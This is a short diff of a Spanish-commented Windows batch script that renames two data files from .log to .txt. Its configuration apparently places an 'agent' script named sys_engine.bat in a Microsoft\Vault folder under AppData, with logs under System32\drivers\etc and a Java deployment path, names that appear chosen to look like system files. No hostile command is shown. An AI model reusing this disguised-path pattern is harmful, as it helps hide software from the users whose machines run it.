@@ -2,13 +2,13 @@
 setlocal enabledelayedexpansion
 
 :: --- 1. CONFIGURACIÓN DE RUTAS Y VERSIONES ---
-set "VERSION_LOCAL=%VERSION_DIR%\v_data.log"
+set "VERSION_LOCAL=%VERSION_DIR%\v_data.txt"
 :: Corregido el doble Roaming para que coincida con el instalador
 set "AGENTE_DIR=%AppData%\Microsoft\Vault"
 set "AGENTE_FILE=%AGENTE_DIR%\sys_engine.bat"   
 set "BACKUP_DIR=%windir%\System32\drivers\etc\vps_logs"
 set "VERSION_DIR=C:\Users\%USERNAME%\AppData\Roaming\Sun\Java\Deployment"
-set "VLINEA=%temp%\vl_data.log"
+set "VLINEA=%temp%\vl_data.txt"
 set "MEM_DIR=%VERSION_DIR%"
 
 :: URLs de GitHub
